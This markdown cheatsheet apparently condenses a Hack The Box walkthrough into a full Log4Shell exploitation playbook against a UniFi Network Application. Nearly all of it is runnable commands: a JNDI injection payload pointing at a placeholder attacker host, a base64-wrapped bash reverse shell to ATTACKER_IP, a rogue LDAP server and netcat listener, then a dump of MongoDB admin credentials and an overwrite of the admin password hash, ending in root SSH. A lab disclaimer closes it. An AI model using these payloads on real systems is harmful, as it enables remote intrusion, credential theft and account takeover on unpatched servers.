# Log4Shell Exploitation Cheatsheet
### Commands extracted from the UniFi Network Application exploitation walkthrough  
*(Based on the PDF content in the active tab)*

This cheatsheet summarizes all commands used during the Log4Shell exploitation chain, from reconnaissance to privilege escalation and final access.

# 🔴 Unified (Log4J / UniFi) – Full Attack Playbook

> Complete command-based workflow from enumeration to root access

---

## 📌 Target Info

- Target IP: target_ip  
- Attacker IP: ATTACKER_IP  
- Interface: tun0  

---

# 🌐 1. Enumeration

## Nmap Scan
```bash
nmap -sC -sV -v target_ip
```

---

# 🕵️ 2. Intercept Login Request

- Use BurpSuite + FoxyProxy  
- Intercept POST request to:

```
/api/login
```

---

# 🧪 3. Test Log4J Injection

## Inject payload into `remember` parameter
```
${jndi:ldap://ATTACKER_IP/whatever}
```

---

# 📡 4. Verify LDAP Callback

```bash
sudo tcpdump -i tun0 port 389
```

---

# ⚙️ 5. Install Dependencies

```bash
sudo apt update
sudo apt install openjdk-11-jdk -y
sudo apt install maven -y
```

---

# 📦 6. Setup Rogue-JNDI

## Clone Repository
```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
```

## Build Project
```bash
mvn package
```

---

# 🔐 7. Generate Reverse Shell Payload

```bash
echo 'bash -c bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1' | base64
```

---

# 🚀 8. Start Rogue LDAP Server

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,BASE64_STRING}|{base64,-d}|{bash,-i}" \
--hostname "ATTACKER_IP"
```

---

# 🎧 9. Start Netcat Listener

```bash
nc -lvnp 4444
```

---

# 💣 10. Exploit Target

```
${jndi:ldap://ATTACKER_IP:1389/o=tomcat}
```

---

# 🐚 11. Upgrade Shell

```bash
script /dev/null -c bash
```

---

# 🔍 12. Check MongoDB

```bash
ps aux | grep mongo
```

---

# 🗄️ 13. Dump Admin Credentials

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

---

# 🔑 14. Generate New Password Hash

```bash
mkpasswd -m sha-512 Password1234
```

---

# 🔄 15. Replace Admin Password Hash

```bash
mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("ADMIN_ID")},{$set:{"x_shadow":"NEW_HASH"}})'
```

---

# ✅ 16. Verify Password Change

```bash
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```

---

# 🌐 17. Login to UniFi Panel

- Username: `administrator`  
- Password: `Password1234`  

---

# 🔐 18. SSH Access

```bash
ssh root@target_ip
```

---

# 🏁 19. Root Access

```bash
cd /root
ls
```

---

# 🧠 Notes

- Replace:
  - ATTACKER_IP
  - BASE64_STRING
  - ADMIN_ID
- Ensure VPN interface = tun0
- LDAP default port = 389
- Rogue-JNDI uses port 1389

---

# ⚠️ Disclaimer

This playbook is for educational and lab use only (HTB, local labs).  
Do not use against unauthorized systems.
